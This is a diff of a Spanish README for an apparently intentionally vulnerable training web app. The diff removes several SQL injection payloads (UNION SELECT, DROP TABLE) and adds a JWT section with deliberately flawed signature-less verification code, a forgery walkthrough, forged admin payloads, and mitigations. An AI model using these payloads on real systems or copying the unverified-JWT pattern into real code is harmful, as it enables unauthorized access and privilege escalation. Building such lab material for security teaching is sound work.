@@ -96,7 +96,6 @@ http://localhost:3000
 
 #### **🎯 Ubicación:**
 - **Login** (`/api/auth/login`)
-- **Búsqueda de usuarios** (`/api/usuarios/buscar`)
 
 #### **📝 Descripción:**
 Las consultas SQL utilizan concatenación directa de strings sin sanitización, permitiendo inyección de código SQL malicioso.
@@ -105,9 +104,6 @@ Las consultas SQL utilizan concatenación directa de strings sin sanitización, 
 ```javascript
 // Login vulnerable
 const query = `SELECT * FROM usuarios WHERE username = '${username}' AND password = '${password}'`;
-
-// Búsqueda vulnerable  
-const query = `SELECT * FROM usuarios WHERE username = '${user}'`;
 ```
 
 #### **💀 Payloads de explotación:**
@@ -118,31 +114,6 @@ Usuario: admin'--
 Contraseña: cualquiera
 ```
 
-**Ver todos los usuarios:**
-```sql
-Búsqueda: ' OR '1'='1'--
-```
-
-**Filtrar por rol admin:**
-```sql
-Búsqueda: ' OR rol='admin'--
-```
-
-**Extraer estructura de la BD:**
-```sql
-Búsqueda: ' UNION SELECT name, '', '', type FROM sqlite_master WHERE type='table'--
-```
-
-**Ver todos los comentarios:**
-```sql
-Búsqueda: ' UNION SELECT archivo, autor, comentario, 'comentario' FROM comentarios--
-```
-
-**Intentar eliminar tabla (puede fallar por permisos):**
-```sql
-Búsqueda: '; DROP TABLE usuarios; --
-```
-
 #### **🛡️ Mitigación:**
 Usar consultas parametrizadas:
 ```javascript
@@ -151,22 +122,21 @@ db.get('SELECT * FROM usuarios WHERE username = ? AND password = ?', [username, 
 
 ---
 
-### **4. 🔓 Vulnerabilidades de autenticación**
+### **4. � Vulnerabilidades de autenticación clásicas**
 
 #### **🎯 Ubicación:**
-- Sistema de sesiones
-- Control de acceso a rutas
+- Almacenamiento de contraseñas
+- Gestión de sesiones (en implementaciones legacy)
 
 #### **📝 Problemas identificados:**
-- Sesiones almacenadas en memoria (se pierden al reiniciar)
-- No hay expiración de sesiones
-- Contraseñas almacenadas en texto plano
-- Session ID predecible (uso de crypto básico)
+- Contraseñas almacenadas en texto plano en la base de datos
+- IDs de base de datos ahora son hashes impredecibles (mejorado)
+- Sistema migrado a JWT (con vulnerabilidad propia)
 
 #### **💀 Posibles explotaciones:**
-- **Session hijacking** si se obtiene el cookie
 - **Fuerza bruta** en contraseñas débiles
-- **Escalación de privilegios** modificando rol en sesión
+- **Exposición de contraseñas** en caso de compromiso de BD
+- **Escalación de privilegios** vía manipulación de JWT (ver vulnerabilidad #4)
 
 ---
 
@@ -276,7 +246,7 @@ function procesarComentario(texto, autor) {
 
 ---
 
-### **4. �📂 Vulnerabilidades de subida de archivos**
+### **5. 📂 Vulnerabilidades de subida de archivos**
 
 #### **🎯 Ubicación:**
 - Endpoint `/api/documentos/upload`
@@ -294,7 +264,7 @@ function procesarComentario(texto, autor) {
 
 ---
 
-### **5. 🌐 Exposición de información**
+### **6. 🌐 Exposición de información**
 
 #### **🎯 Ubicación:**
 - Búsqueda de usuarios devuelve contraseñas
@@ -305,5 +275,189 @@ function procesarComentario(texto, autor) {
 - Contraseñas en texto plano
 - Estructura de la base de datos
 - Detalles técnicos en errores
+
+---
+
+### **7. 🔓 Vulnerabilidad JWT (JSON Web Token)**
+
+#### **🎯 Ubicación:**
+- Sistema de autenticación (`/backend/utils/jwt.js`)
+- Middlewares de autenticación en todos los endpoints protegidos
+
+#### **📝 Descripción:**
+El sistema utiliza JWT para autenticación, pero la función de verificación tiene una vulnerabilidad crítica: **no verifica la firma del token**. Solo decodifica el JWT y verifica la estructura básica, permitiendo que tokens maliciosos sean aceptados como válidos.
+
+#### **🔓 Código vulnerable:**
+```javascript
+// VULNERABILIDAD CRÍTICA: Verificación defectuosa del JWT
+function verifyToken(token) {
+  try {
+    // VULNERABILIDAD: Decodifica sin verificar la firma
+    const decoded = jwt.decode(token, { complete: true });
+    
+    if (!decoded || !decoded.payload) {
+      return null;
+    }
+    
+    // Solo verifica que tenga la estructura correcta, NO la firma
+    const payload = decoded.payload;
+    
+    // Verificación básica de campos requeridos
+    if (!payload.id || !payload.username || !payload.rol) {
+      return null;
+    }
+    
+    // Verificar expiración (esta parte sí funciona)
+    if (payload.exp && payload.exp < Math.floor(Date.now() / 1000)) {
+      return null; // Token expirado
+    }
+    
+    return payload; // ⚠️ ACEPTA CUALQUIER TOKEN CON ESTRUCTURA CORRECTA
+  } catch (error) {
+    return null;
+  }
+}
+```
+
+#### **💀 Explotación paso a paso:**
+
+**Paso 1: Obtener un token válido**
+- Hacer login legítimo con cualquier usuario (ej: `user/user123`)
+- Capturar el JWT desde localStorage o desde las herramientas de desarrollo
+
+**Paso 2: Decodificar y modificar el token**
+- Usar herramientas como jwt.io para decodificar el token
+- Modificar el payload, por ejemplo cambiar `"rol": "user"` a `"rol": "admin"`
+- Cambiar el `username` si se desea
+
+**Paso 3: Crear token malicioso**
+- Generar un nuevo JWT con el payload modificado
+- **No importa la firma** ya que no se verifica
+
+**Paso 4: Usar el token falsificado**
+- Reemplazar el token en localStorage/sessionStorage
+- O enviarlo en el header Authorization: `Bearer TOKEN_FALSO`
+
+#### **💀 Ejemplos de explotación:**
+
+**Ejemplo 1: Escalación de privilegios a admin**
+```javascript
+// Token original decodificado:
+{
+  "id": "abc123...",
+  "username": "user",
+  "rol": "user",
+  "iat": 1640995200,
+  "exp": 1641081600
+}
+
+// Token malicioso (cambiar rol a admin):
+{
+  "id": "abc123...",
+  "username": "user", 
+  "rol": "admin",  // ⚠️ ESCALACIÓN DE PRIVILEGIOS
+  "iat": 1640995200,
+  "exp": 1641081600
+}
+```
+
+**Ejemplo 2: Suplantación de identidad**
+```javascript
+// Crear token como superadmin sin conocer sus credenciales:
+{
+  "id": "fake-id-123",
+  "username": "superadmin",
+  "rol": "admin",
+  "iat": 1640995200,
+  "exp": 2147483647  // Expiración muy lejana
+}
+```
+
+**Ejemplo 3: Bypass de autenticación**
+```javascript
+// Token completamente falso pero con estructura correcta:
+{
+  "id": "hacker-id",
+  "username": "hacker",
+  "rol": "admin",
+  "iat": 1640995200,
+  "exp": 2147483647
+}
+```
+
+#### **🔍 Herramientas para explotar:**
+
+**Usando jwt.io:**
+1. Pegar el token original en jwt.io
+2. Modificar el payload en la sección derecha
+3. Copiar el nuevo token (ignorar la advertencia de "signature invalid")
+4. Usar el token modificado en la aplicación
+
+**Usando código JavaScript:**
+```javascript
+// Crear token falso sin verificación de firma
+const fakePayload = {
+  id: "fake-id",
+  username: "admin",
+  rol: "admin",
+  iat: Math.floor(Date.now() / 1000),
+  exp: Math.floor(Date.now() / 1000) + (60 * 60 * 24 * 365) // 1 año
+};
+
+// Crear JWT falso (header + payload + firma_falsa)
+const header = btoa(JSON.stringify({typ: "JWT", alg: "HS256"}));
+const payload = btoa(JSON.stringify(fakePayload));
+const fakeToken = header + "." + payload + ".fake_signature";
+
+// Usar en localStorage
+localStorage.setItem('jwt_token', fakeToken);
+```
+
+#### **🛡️ Mitigación:**
+```javascript
+// Función CORRECTA para verificar JWT
+function verifyTokenCorrectly(token) {
+  try {
+    // ✅ USAR jwt.verify() que SÍ verifica la firma
+    return jwt.verify(token, JWT_SECRET);
+  } catch (error) {
+    return null;
+  }
+}
+```
+
+---
+
+## 🔄 **CAMBIOS Y MEJORAS RECIENTES**
+
+### **Migración a JWT y nuevas vulnerabilidades**
+
+#### **✅ Mejoras implementadas:**
+- **IDs hash impredecibles**: Los usuarios y comentarios ahora usan IDs hash criptográficos en lugar de IDs numéricos secuenciales
+- **Autenticación JWT**: Sistema migrado de sesiones en memoria a JSON Web Tokens
+- **Frontend modularizado**: Gestión de autenticación centralizada con `AuthManager`
+- **Mejor UX**: Manejo de tokens tanto en localStorage como sessionStorage según preferencia del usuario
+
+#### **🚨 Nueva vulnerabilidad crítica agregada:**
+- **Verificación JWT defectuosa**: La función `verifyToken()` no verifica la firma, permitiendo tokens falsificados
+- **Escalación de privilegios**: Posible bypass completo de autenticación y escalación a admin
+- **Herramientas de explotación**: Documentados métodos con jwt.io y código JavaScript
+
+#### **🎯 Objetivos educativos:**
+Esta aplicación ahora contiene **7 vulnerabilidades diferentes** que cubren:
+- **Injection**: SQLi en login y búsqueda de usuarios
+- **Broken Authentication**: JWT sin verificación de firma
+- **Sensitive Data Exposure**: Contraseñas en texto plano, información de usuarios
+- **Security Misconfiguration**: Plantillas vulnerables, validación deficiente
+- **Remote Code Execution**: JavaScript injection en comentarios
+- **File Upload**: Validación bypasseable de archivos
+
+#### **📚 Valor educativo:**
+- Ejemplos **realistas** de vulnerabilidades comunes en aplicaciones web modernas
+- **Código vulnerable** documentado con explicaciones técnicas
+- **Payloads funcionales** para practicar técnicas de penetration testing
+- **Mitigaciones correctas** para aprender buenas prácticas de seguridad
+
+---
 
 
